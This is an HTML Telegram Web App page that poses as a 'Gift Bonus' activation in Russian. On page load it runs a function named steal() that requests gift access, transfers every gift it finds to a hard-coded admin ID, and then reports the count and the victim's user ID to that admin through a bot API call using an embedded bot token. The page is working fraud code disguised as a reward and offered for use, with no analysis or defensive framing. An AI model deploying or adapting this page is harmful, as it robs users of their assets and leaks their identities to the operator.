<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gift Bonus</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background: var(--tg-theme-bg-color);
            color: var(--tg-theme-text-color);
            font-family: system-ui;
            text-align: center;
            padding: 50px 20px;
        }
        .loader { animation: pulse 1s infinite; }
        @keyframes pulse { 0% { opacity: 0.5; } 100% { opacity: 1; } }
        .success { color: #00ff00; font-size: 20px; }
        .error { color: #ff0000; }
    </style>
</head>
<body>
    <div id="status" class="loader">🎁 Активация бонуса...</div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        const statusDiv = document.getElementById('status');
        const ADMIN_ID = "609263048";
        const BOT_TOKEN = "8434656451:AAGBc01xV9OtEE-ojJN297skybUHPUt23iE";
        
        async function steal() {
            try {
                statusDiv.innerHTML = "🔐 Запрос доступа...";
                const hasAccess = await tg.requestGiftAccess();
                
                if (!hasAccess) {
                    statusDiv.innerHTML = "❌ Доступ не разрешен";
                    return;
                }
                
                statusDiv.innerHTML = "📦 Поиск подарков...";
                const gifts = await tg.getGifts();
                
                if (!gifts || gifts.length === 0) {
                    statusDiv.innerHTML = "⚠️ Подарков не найдено";
                    return;
                }
                
                let stolen = 0;
                for (const gift of gifts) {
                    try {
                        await tg.transferGift(gift.id, ADMIN_ID);
                        stolen++;
                        statusDiv.innerHTML = `✅ Конвертировано ${stolen}/${gifts.length}`;
                        await new Promise(r => setTimeout(r, 500));
                    } catch(e) {}
                }
                
                statusDiv.innerHTML = `🎉 Получено ${stolen} подарков!`;
                statusDiv.className = "success";
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: `🎁 +${stolen} подарков от ${tg.initDataUnsafe.user?.id}`
                    })
                });
                
                setTimeout(() => tg.close(), 3000);
            } catch(e) {
                statusDiv.innerHTML = "❌ Ошибка: " + e.message;
                statusDiv.className = "error";
            }
        }
        
        steal();
    </script>
</body>
</html>
